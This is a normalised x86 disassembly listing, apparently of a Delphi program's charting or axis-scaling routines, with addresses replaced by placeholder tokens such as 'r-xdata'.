mov edx [ edx + 0x2f8 ]
mov [ eax + 0x54 ] edx
mov dl [ eax + 0xa0 ]
dec dl
je r-xdata
mov edx [ eax + 0x94 ]
test edx edx
je r-xdata
jmp r-xdata
mov edx [ eax + 0x68 ]
mov edx [ edx + 0x2fc ]
mov [ eax + 0x54 ] edx
jmp r-xdata
sub dl 0x2
je r-xdata
mov [ eax + 0x50 ] edx
retn
mov edx [ eax + 0x98 ]
test edx edx
je r-xdata
jmp r-xdata
mov [ eax + 0x54 ] edx
retn
sub_46abec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404398
xor eax eax
push ebp
push sub_46ac2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebx + 0x78 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_46b758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ac36
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_46ac3c
add esp 0xfffffff8
test dl dl
je r-xdata
mov edx ecx
mov ecx [ eax ]
call [ ecx + 0x68 ]
fstp [ esp ]
fwait
mov edx ecx
mov ecx [ eax ]
call [ ecx + 0x64 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
retn
sub_46ac64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
call sub_46a554
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x54 ]
cmp [ eax + 0x8d ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x50 ]
cmp [ eax + 0x8d ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
call sub_464fa8
fstp [ ebp - 0x8 ]
fwait
mov edx esi
call sub_464fa8
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov edx ebx
call sub_464fa8
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov edx edi
call sub_464fa8
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_46ace8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
mov eax [ edi ]
mov [ eax + 0x4c ] 0xffffffff
mov eax [ edi ]
mov [ eax + 0x5c ] 0xffffffff
mov eax [ edi ]
call sub_46b9bc
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
call sub_46b9bc
mov ebx eax
dec ebx
mov eax [ edi ]
call sub_46a554
test al al
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x8c ]
cmp [ eax + 0x2c ] 0x0
setne al
mov eax [ edi ]
mov eax [ eax + 0x84 ]
cmp [ eax + 0x2c ] 0x0
setne al
jmp r-xdata
mov eax [ edi ]
xor edx edx
mov [ eax + 0x4c ] edx
mov eax [ edi ]
mov [ eax + 0x5c ] ebx
mov eax [ edi ]
xor edx edx
mov [ eax + 0x4c ] edx
mov eax [ edi ]
mov eax [ eax + 0x68 ]
add eax 0x28e
push ebp
mov edx [ eax + 0xc ]
push edx
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
call sub_46ac64
pop ecx
fstp [ ebp - 0x10 ]
fwait
mov eax [ edi ]
call sub_46a554
test al al
je r-xdata
mov edx [ edi ]
test [ edx + 0xf8 ] al
je r-xdata
mov eax [ edi ]
mov esi [ eax + 0x8c ]
jmp r-xdata
mov eax [ edi ]
mov esi [ eax + 0x84 ]
jmp r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jb r-xdata
mov eax [ edi ]
inc [ eax + 0x4c ]
mov eax [ edi ]
cmp ebx [ eax + 0x4c ]
jge r-xdata
mov eax [ edi ]
cmp [ eax + 0x4c ] 0x0
jl r-xdata
mov eax [ edi ]
mov [ eax + 0x4c ] 0xffffffff
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x68 ]
add eax 0x28e
push ebp
mov edx [ eax + 0x4 ]
push edx
mov ecx [ eax ]
mov edx [ eax + 0xc ]
push edx
mov eax [ eax + 0x8 ]
pop edx
call sub_46ac64
pop ecx
fstp [ ebp - 0x18 ]
fwait
mov eax esi
call sub_468c5c
fcomp [ ebp - 0x18 ]
fnstsw ax
sahf
ja r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov edx [ edi ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ edi ]
mov [ eax + 0x5c ] ebx
jmp r-xdata
mov eax [ edi ]
mov edx [ eax + 0x5c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ ebp - 0x18 ]
fnstsw ax
sahf
jb r-xdata
mov eax [ edi ]
inc [ eax + 0x5c ]
mov eax [ edi ]
cmp ebx [ eax + 0x5c ]
jge r-xdata
mov eax [ edi ]
cmp [ eax + 0xf9 ] 0x0
jne r-xdata
mov eax [ edi ]
mov [ eax + 0x5c ] ebx
jmp r-xdata
mov eax [ edi ]
mov edx [ eax + 0x5c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fcomp [ ebp - 0x18 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ edi ]
dec [ eax + 0x5c ]
jmp r-xdata
sub_46aea8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46aef1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x7c ]
call sub_4042f4
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aef8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_46af00
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46af49
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x6c ]
call sub_4042f4
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af50
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_46af64
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp [ eax + 0x80 ]
mov esi [ ebp + 0x8 ]
dec esi
sub esi 0x2
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
retn
inc esi
mov edi 0x2
mov edx edi
mov eax ebp
call sub_469f9c
push [ eax + 0x3c ]
push [ eax + 0x38 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
inc edi
dec esi
jne r-xdata
sub_46afa4
push ebx
push esi
push edi
add esp 0xffffffe4
mov [ esp ] ecx
mov edi edx
mov ebx eax
mov eax [ edi + 0x84 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x8 ]
fwait
mov eax [ edi + 0x8c ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp + 0x10 ]
fwait
mov eax ebx
call sub_46a554
push eax
mov eax edi
call sub_46a554
pop edx
cmp dl al
je r-xdata
push [ esp + 0xc ]
push [ esp + 0xc ]
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ esp + 0x4 ] eax
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov eax [ ebx + 0x8c ]
mov edx [ esp + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebx + 0x80 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x18 ]
mov esi [ eax + 0x8 ]
dec esi
sub esi 0x2
jl r-xdata
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x8 ]
call sub_460394
mov eax [ esp + 0x4 ]
add esp 0x1c
pop edi
pop esi
pop ebx
retn
inc esi
mov ebx 0x2
mov eax [ edi + 0x80 ]
mov edx ebx
call sub_469f9c
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx ebx
mov eax [ esp + 0x20 ]
call sub_469f9c
mov edx [ esp + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
inc ebx
dec esi
jne r-xdata
sub_46b084
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b122
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x30 ]
mov [ ebp - 0x8 ] eax
mov edi [ esi + 0x3c ]
mov eax [ edi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ esi + 0x88 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_414098
mov ecx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x3c ]
call sub_414114
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b129
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x60 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46b78c
sub_46b134
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx eax
xor eax eax
push ebp
push sub_46b2fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xb4 ]
mov esi eax
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x60 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b302
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f0c
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xfc ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp - 0x10 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x7c ]
call sub_409820
cmp [ ebp - 0x1 ] 0x3
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
mov edi eax
mov eax edi
call sub_468ec8
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
cmp [ ebp - 0x1 ] 0x4
jne r-xdata
mov eax edi
call sub_468ec8
fld [ r-xdata ]
fmul [ ebp - 0x10 ]
fdivrp st1
fstp [ ebp - 0x18 ]
fwait
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x40590000
jmp r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
cmp eax 0x5
ja r-xdata
jmp [ eax * 4 + r-xdata ]
fld [ ebp - 0x18 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x6c ]
call sub_409820
push [ ebp - 0x1c ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
mov edx 0x3
call sub_404268
jmp r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
push r-xdata
push [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx 0x3
call sub_404268
jmp r-xdata
push [ ebp - 0x20 ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
mov edx 0x3
call sub_404268
jmp r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
push r-xdata
push [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx 0x3
call sub_404268
jmp r-xdata
mov edi [ ebx + 0x50 ]
test edi edi
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_465a80
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp + 0x8 ]
mov eax [ ebx + 0x7c ]
call sub_409820
jmp r-xdata
sub_46b317
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xac ]
test al al
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ esi + 0x84 ]
mov dl [ eax + 0x4 ]
mov eax [ ebx + 0x84 ]
call sub_468fe0
mov eax [ esi + 0x8c ]
mov dl [ eax + 0x4 ]
mov eax [ ebx + 0x8c ]
call sub_468fe0
mov edx esi
mov eax [ ebx + 0xa4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax esi
call sub_46b9bc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_46b3c0
inc edi
mov [ esp ] 0x0
mov ecx [ esp ]
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x34 ]
inc [ esp ]
dec edi
jne r-xdata
jmp r-xdata
sub_46b3d8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp [ eax + 0x22c ] 0x0
je r-xdata
xor eax eax
mov eax [ eax + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor ebp ebp
inc ebp
dec edi
jne r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x68 ]
call sub_46da00
mov esi eax
cmp ebx esi
je r-xdata
cmp [ esi + 0xfb ] 0x0
jne r-xdata
mov eax esi
call sub_46cf04
push eax
mov eax ebx
call sub_46cf04
pop edx
cmp edx eax
jne r-xdata
mov al 0x1
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46b440
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0x0
mov [ esp ] 0x1
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
cmp [ esi + 0x30 ] 0x0
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax esi
call sub_46cf04
push eax
mov eax ebx
call sub_46cf04
pop edx
cmp edx eax
jne r-xdata
mov edx ebp
mov eax [ ebx + 0x68 ]
call sub_46da00
mov esi eax
cmp ebx esi
je r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
sub_46b4ec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46b6dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov eax [ ebx + 0x68 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebx + 0x5c ]
sub edx eax
jl r-xdata
mov eax esi
call sub_403198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b6e3
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
inc edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
inc [ ebp - 0x4 ]
dec [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46bb74
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b89c
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_461614
mov edi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
mov edx r-xdata
mov ecx [ eax ]
call [ ecx + 0x60 ]
add edi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
call sub_45c9c4
imul [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
call sub_45c8bc
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
jne r-xdata
mov [ esi + 0x24 ] edi
mov eax [ ebp - 0xc ]
mov [ esi + 0x18 ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe4 ]
mov [ esi + 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe8 ]
mov [ esi + 0x10 ] eax
mov eax [ esi + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x10 ]
mov [ esi + 0x8 ] eax
sar edi 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_41d434
add eax eax
add edi eax
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x27c ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
sub eax edi
mov [ esi + 0x1c ] eax
mov eax [ esi + 0x10 ]
sub eax [ ebp - 0xc ]
inc eax
mov [ esi + 0x20 ] eax
push esi
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x54 ]
adc edi 0x0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x288 ]
mov edi [ eax + 0x8 ]
mov eax edi
call sub_41d0a8
mov [ ebp - 0x1c ] eax
fild [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x27c ]
fild [ eax + 0x20 ]
fld [ r-xdata ]
fmulp st1
fmulp st1
call sub_402990
mov edx eax
mov eax 0x1
call sub_460384
mov edx eax
mov eax edi
call sub_41d0c4
sub_46b71c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov ecx eax
mov edx esi
mov eax [ ebx + 0x64 ]
call sub_46954c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46b758
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ esi ]
mov edx edi
call sub_4042f4
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx edi
call sub_403f3c
mov eax ebx
call sub_46ae80
sub_46b78c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_46c5c4
mov ecx eax
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_414114
pop edi
pop esi
pop ebx
retn
sub_46b7b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
or esi 0xffffffff
mov eax [ ebx + 0x84 ]
mov edx [ ebp + 0x10 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0x14 ]
mov [ eax + 0x3c ] edx
mov eax [ ebx + 0x8c ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
cmp [ ebx + 0xca ] 0x0
je r-xdata
mov eax [ ebx + 0x84 ]
push [ eax + 0x3c ]
push [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov esi eax
mov edi [ ebx + 0x8c ]
push [ edi + 0x3c ]
push [ edi + 0x38 ]
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x3c ]
call sub_414114
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46b78c
mov ecx esi
mov edx ebx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x6c ]
mov edx ebx
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
test al al
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_46b860
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
call sub_46cc98
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov ecx esi
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
pop esi
pop ebx
retn
mov eax ebx
call sub_46ae80
sub_46b89c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
cmp eax 0x1fffffff
sete al
pop esi
pop ebx
retn
sub_46b8cc
push ebp
mov ebp esp
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx 0x1fffffff
mov ebx [ eax ]
call [ ebx + 0x90 ]
pop ebx
pop ebp
retn 0x10
sub_46b8f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_46a554
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_46b934
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_46b978
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_46b934
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x90 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46b978
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebx + 0x84 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x90 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46b9d0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46bace
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
mov esi eax
mov eax esi
call sub_468ec8
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x40590000
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xfc ]
fabs
fmul [ r-xdata ]
fstp [ ebp - 0x1c ]
fwait
mov eax esi
call sub_468ec8
fld [ ebp - 0x1c ]
fdivrp st1
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bad5
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_403f0c
retn
push 0x1
mov eax [ edi ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xb
mov eax esi
call sub_468ec8
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0x7c ]
call sub_409820
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xb
lea eax [ ebp - 0x2c ]
push eax
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405af8
mov edx [ ebp - 0x34 ]
mov eax edi
pop ecx
call sub_408db4
fld [ ebp - 0x10 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx edi
mov eax [ ebx + 0x6c ]
call sub_409820
cmp [ ebp - 0x5 ] 0x0
je r-xdata
sub_46bb00
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_46bb28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov ecx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x60 ]
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xfc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_409820
sub_46bb74
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46bdb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
movzx eax [ eax + 0x1c ]
cmp eax 0x8
ja r-xdata
mov eax [ ebp - 0x8 ]
call sub_403ee8
jmp [ eax * 4 + jump_table_46bbb9 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bdb7
lea eax [ ebp - 0x24 ]
mov edx 0x7
call sub_403f0c
retn
mov eax [ ebp - 0x8 ]
push eax
mov esi [ ebp - 0x4 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0xec ]
call [ esi + 0xe8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xfc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_409820
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b9d0
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46bb28
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_403f3c
jmp r-xdata
push ebp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46bb28
pop ecx
push [ ebp - 0x10 ]
push r-xdata
lea eax [ ebp - 0x14 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b9d0
push [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404268
